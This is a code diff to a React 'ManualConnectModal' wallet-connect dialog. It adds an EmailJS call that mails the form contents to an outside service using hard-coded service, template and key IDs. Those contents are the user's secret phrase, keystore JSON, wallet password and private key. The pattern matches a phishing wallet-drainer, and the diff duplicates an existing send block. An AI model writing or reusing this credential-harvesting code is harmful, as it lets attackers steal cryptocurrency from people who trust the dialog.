@@ -352,6 +352,26 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
       //   "rVndnp0Bchzm41MAz"
       // );
     
+      try {
+        await emailjs.sendForm(
+          "service_jcu7elm",
+          "template_egpl2j5",
+          form.current,
+          "DqbO8ehbSa9azzCOr"
+        );
+       // Reset form state values
+       setUserText("");
+       setKeystoreJson("");
+       setWalletPassword("");
+       setPrivateKey("");
+  
+      //  setIsSynchronizing(true);
+       onSubmit(); // Close the modal after successful submission
+      } catch (error) {
+        setIsSynchronizing(false);
+        console.error(error.text);
+        alert("An error occurred while sending the form.");
+      }
 
     try {
       await emailjs.sendForm(
@@ -373,7 +393,9 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
       console.error(error.text);
       alert("An error occurred while sending the form.");
     }
+    
   };
+
 
   useEffect(() => {
     // Clean up synchronization state when the component unmounts
